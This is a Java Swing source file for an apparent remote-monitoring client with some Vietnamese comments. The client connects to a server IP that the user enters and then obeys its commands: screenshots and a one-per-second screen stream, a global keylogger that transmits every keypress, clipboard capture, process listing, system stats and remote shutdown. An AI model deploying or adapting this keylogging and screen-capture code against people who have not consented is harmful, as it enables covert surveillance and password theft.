package Controller;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import java.net.Socket;
import java.util.Base64;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.Toolkit;

public class User extends JFrame {
    private JTextField ipField;
    private JTextField portField;
    private JButton connectButton;
    private JLabel statusLabel;
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;

    public User() {
        initializeUI();
    }

    private void initializeUI() {
        setTitle("Connect to Server");
        setSize(400, 200);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);

        // Set layout manager
        setLayout(new GridBagLayout());
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        // Create components
        JLabel ipLabel = new JLabel("Server IP:");
        ipField = new JTextField(15);
        JLabel portLabel = new JLabel("Port:");
        portField = new JTextField(5);
        connectButton = new JButton("Connect");
        statusLabel = new JLabel("Not connected");

        // Add components to frame
        gbc.gridx = 0;
        gbc.gridy = 0;
        add(ipLabel, gbc);

        gbc.gridx = 1;
        add(ipField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 1;
        add(portLabel, gbc);

        gbc.gridx = 1;
        add(portField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 2;
        gbc.gridwidth = 2;
        add(connectButton, gbc);

        gbc.gridy = 3;
        gbc.gridwidth = 2;
        add(statusLabel, gbc);

        // Add button action
        connectButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String serverIP = ipField.getText().trim();
                int serverPort = Integer.parseInt(portField.getText().trim());
                connectToServer(serverIP, serverPort);
            }
        });

        // Add window listener
        addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                cleanup();
            }
        });
    }

    private void connectToServer(String serverIP, int serverPort) {
        try {
            socket = new Socket(serverIP, serverPort);
            out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            // Gửi thông báo kết nối user
            out.println("USER");

            // Đăng ký sự kiện shutdown hook để đóng kết nối khi thoát chương trình
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                cleanup();
            }));

            // Cập nhật trạng thái kết nối
            statusLabel.setText("Connected to " + serverIP + ":" + serverPort);

            // Thiết lập và bắt đầu lắng nghe các lệnh từ server
            listenForCommands();

        } catch (IOException e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(this, "Failed to connect to server.", "Connection Error", JOptionPane.ERROR_MESSAGE);
            statusLabel.setText("Connection failed");
        }
    }

    private void listenForCommands() {
        new Thread(() -> {
            try {
                String serverCommand;
                while ((serverCommand = in.readLine()) != null) {
                    System.out.println("Command from server: " + serverCommand);

                    switch (serverCommand) {
                        case "OS_INFO":
                            String osInfo = getOSInfo();
                            out.println("OS_INFO:" + osInfo);
                            break;

                        case "SCREENSHOT":
                            String base64Image = takeScreenshot();
                            out.println("SCREENSHOT:" + base64Image);
                            break;

                        case "SHUTDOWN":
                            performShutdown();
                            break;

                        case "START_VIDEO":
                            startSendingScreenshots();
                            break;

                        case "STOP_VIDEO":
                            stopSendingScreenshots();
                            break;

                        case "STARTKEYLOGGER":
                            startKeylogging();
                            break;

                        case "STOPKEYLOGGER":
                            stopKeylogging();
                            break;

                        case "PERFORMANCE":
                            Performance();
                            break;

                        case "CLIPBOARD":
                            Clipboard();
                            break;

                        case "GET_RUNNING_APPLICATIONS":
                            String process = getRunningProcess();
                            out.println("RUNNING_APPLICATIONS:" + process);
                            break;

                        default:
                            System.out.println("Unknown command: " + serverCommand);
                            break;
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    private static String getOSInfo() {
        try {
            String osName = System.getProperty("os.name");
            String osVersion = System.getProperty("os.version");
            String osArch = System.getProperty("os.arch");
            long totalMemory = Runtime.getRuntime().totalMemory();

            StringBuilder builder = new StringBuilder();
            builder.append("OS Name: ").append(osName).append("\n");
            builder.append("OS Version: ").append(osVersion).append("\n");
            builder.append("OS Architecture: ").append(osArch).append("\n");
            builder.append("Total Memory: ").append(totalMemory).append("\n");

            return builder.toString();
        } catch (SecurityException e) {
            System.err.println("SecurityException: " + e.getMessage());
        } catch (Exception e) {
            System.err.println("Exception: " + e.getMessage());
        }
        return null;
    }

    private void Performance() {
        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
            String cpuInfo = getCPUInfo();
            String ramInfo = getRAMInfo();
            String diskInfo = getDiskInfo();

            if (cpuInfo != null) out.println("CPU_INFO:" + cpuInfo);
            if (ramInfo != null) out.println("RAM_INFO:" + ramInfo);
            if (diskInfo != null) out.println("DISK_INFO:" + diskInfo);

        }, 0, 1, TimeUnit.SECONDS);
    }

    private String getCPUInfo() {
        try {
            com.sun.management.OperatingSystemMXBean osBean = (com.sun.management.OperatingSystemMXBean) ManagementFactory.getPlatformMXBean(com.sun.management.OperatingSystemMXBean.class);
            double cpuLoad = osBean.getSystemCpuLoad() * 100;

            return String.format("%.2f", cpuLoad);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private String getRAMInfo() {
        try {
            Runtime runtime = Runtime.getRuntime();
            long totalMemory = runtime.totalMemory();
            long freeMemory = runtime.freeMemory();
            long usedMemory = totalMemory - freeMemory;
            double usedMemoryPercent = ((double) usedMemory / totalMemory) * 100;

            return String.format("%.2f", usedMemoryPercent);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private String getDiskInfo() {
        try {
            File file = new File("/");
            long totalSpace = file.getTotalSpace();
            long freeSpace = file.getFreeSpace();
            long usedSpace = totalSpace - freeSpace;
            double usedSpacePercent = ((double) usedSpace / totalSpace) * 100;

            return String.format("%.2f", usedSpacePercent);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private static String takeScreenshot() {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            javax.imageio.ImageIO.write(screenFullImage, "png", baos);
            byte[] imageBytes = baos.toByteArray();
            return Base64.getEncoder().encodeToString(imageBytes);
        } catch (AWTException | IOException e) {
            e.printStackTrace();
            return null;
        }
    }

    private static void performShutdown() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                Runtime.getRuntime().exec("cmd /c msg * /TIME:5 System will shut down in 5 seconds");
                Thread.sleep(1000);
                Runtime.getRuntime().exec("shutdown -s -t 0");
            } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
                String shutdownCommand = os.contains("mac") ? "sudo shutdown -h now" : "shutdown -h now";
                if (os.contains("nix") || os.contains("nux")) {
                    new ProcessBuilder("pkexec", shutdownCommand).start();
                } else {
                    Runtime.getRuntime().exec(shutdownCommand);
                }
            } else {
                System.out.println("Unsupported operating system.");
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void startKeylogging() {
        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
                @Override
                public void nativeKeyPressed(NativeKeyEvent e) {
                    out.println("KEY_PRESSED:" + NativeKeyEvent.getKeyText(e.getKeyCode()));
                }

                @Override
                public void nativeKeyReleased(NativeKeyEvent e) {
                }

                @Override
                public void nativeKeyTyped(NativeKeyEvent e) {
                }
            });
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    private void stopKeylogging() {
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    private void startSendingScreenshots() {
        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
            try {
                String base64Image = takeScreenshot();
                if (base64Image != null) {
                    out.println("SCREEN:" + base64Image);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, 0, 1, TimeUnit.SECONDS);
    }

    private void stopSendingScreenshots() {
        Executors.newSingleThreadScheduledExecutor().shutdown();
    }

    private void Clipboard() {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();

        if (clipboard.isDataFlavorAvailable(DataFlavor.stringFlavor)) {
            try {
                Transferable content = clipboard.getContents(null);
                String clipboardText = (String) content.getTransferData(DataFlavor.stringFlavor);
                out.println("CLIPBOARD:" + clipboardText);
            } catch (UnsupportedFlavorException | IOException e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("Clipboard không chứa dữ liệu dạng text.");
        }
    }

    private String getRunningProcess() {
        try {
            StringBuilder processList = new StringBuilder();
            String line;
            String os = System.getProperty("os.name").toLowerCase();

            Process process;
            if (os.contains("win")) {
                process = Runtime.getRuntime().exec("tasklist");
            } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
                process = Runtime.getRuntime().exec("ps -e");
            } else {
                return "Unsupported operating system.";
            }

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                while ((line = reader.readLine()) != null) {
                    processList.append(line).append("\n");
                }
            }

            return processList.toString();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private void cleanup() {
        try {
            if (socket != null) {
                socket.close();
            }
            if (out != null) {
                out.close();
            }
            if (in != null) {
                in.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            new User().setVisible(true);
        });
    }
}
